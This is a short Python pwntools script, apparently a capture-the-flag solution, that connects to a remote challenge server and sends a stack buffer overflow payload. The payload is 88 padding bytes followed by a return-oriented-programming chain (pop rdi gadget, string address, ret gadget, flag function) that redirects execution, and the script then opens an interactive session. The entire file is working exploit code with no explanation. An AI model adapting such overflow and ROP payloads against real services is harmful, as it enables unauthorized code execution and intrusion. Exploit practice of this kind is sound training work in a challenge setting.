from pwn import *

p = remote("tcp.espark.tn", 5001)
pause()

pop_rdi = p64(0x000000000040118a)
ret = p64(0x00000000004010d0)
flag_func = p64(0x000000000040118f)
brik_str = p64(0x403025)

payload = b'A' * 88
payload += pop_rdi
payload += brik_str
payload += ret
payload += flag_func

print(f"Payload: {payload}")

p.sendline(payload)

p.interactive()

